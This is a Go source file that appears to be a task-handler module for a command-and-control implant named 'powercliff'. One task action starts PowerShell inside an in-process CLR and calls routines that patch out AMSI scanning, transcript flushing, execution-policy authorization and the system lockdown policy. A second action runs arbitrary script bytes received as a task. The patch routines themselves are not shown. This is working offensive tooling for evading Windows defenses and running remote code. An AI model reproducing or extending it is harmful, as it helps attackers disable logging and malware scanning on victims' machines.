package main

/*
#include <stdlib.h>
*/
import "C"

import (
	"fmt"
)

var etwEvaded bool

var amsiEvaded bool

type Task struct {
	TaskId     string `json:"taskid"`
	TaskAction string `json:"taskaction"`
	Script     []byte `json:"script"`

	// General Purpose
	status   string
	tasktype string
}

func InitialiseTask(task *Task) error {
	task.tasktype = "resppwsh"
	return nil
}

func TaskHandler(task *Task) (stdout []byte, err error) {
	switch task.TaskAction {

	case "start-powercliff":
		a, v, err := Startpowershell()
	    if err != nil {
			task.status = "failed"
			return []byte(err.Error()), err
		}
		AppDomain = a
		VtPwsh = &v

		startCLR := "Started Powershell CLR and Variant. "
		errPatchStr := ""
	    err = PatchTranscriptionOptionFlushContentToDisk(AppDomain)
	    if err != nil {
			task.status = "failed"
			errPatchStr += "Error Patching TransctiptionOptionFlushContentToDisk" + err.Error()
	    }
	    err = PatchAmsiWithScanContent(AppDomain)
	    if err != nil {
			task.status = "failed"
			errPatchStr += "Error Patching AuthoriuzationManagerShouldRunInternal" + err.Error()
	    }
	    err = PatchAuthorizationManagerShouldRunInternal(AppDomain)
	    if err != nil {
			task.status = "failed"
			errPatchStr += "Error Patching AuthoriuzationManagerShouldRunInternal" + err.Error()
	    }
	    err = PatchSystemPolicyGetSystemLockdownPolicy(AppDomain)
	    if err != nil {
			task.status = "failed"
			errPatchStr += "Error Patching PatchSystemPolicyGetSystemLockdownPolicy" + err.Error()
	    }

		if errPatchStr == "" {
			task.status = "completed"
			return []byte("Started Powershell CLR and Variant. Patched all function correctly."), nil
		}

		task.status = "failed"
		return []byte(startCLR + "Error in some patching" + errPatchStr), fmt.Errorf(errPatchStr)
	
	case "exec":
		if AppDomain == nil || VtPwsh == nil {
			task.status = "failed"
			return []byte("Powercliff is not started. Please Start Powercliff."), nil
		}
		stdout, err := ExecuteScript(AppDomain, *VtPwsh, string(task.Script))
	    if err != nil {
			task.status = "failed"
			return []byte("Error In powercliff during execution"), err
		}
		task.status = "completed"
		return []byte(stdout), nil

	
	}
	task.status = "failed"
	return []byte("Invalid task action"), err
}

// Tell us if task if done (failed or completed)
func IsTaskDone(task Task) bool {
	if task.status == "completed" || task.status == "failed" {
		return true
	}
	return false
}

// Return Task Status
func ComputeTaskStatus(task Task) string {
	return task.status
}

// Return Task Type
func ComputeTaskType(task Task) string {
	return task.tasktype
}
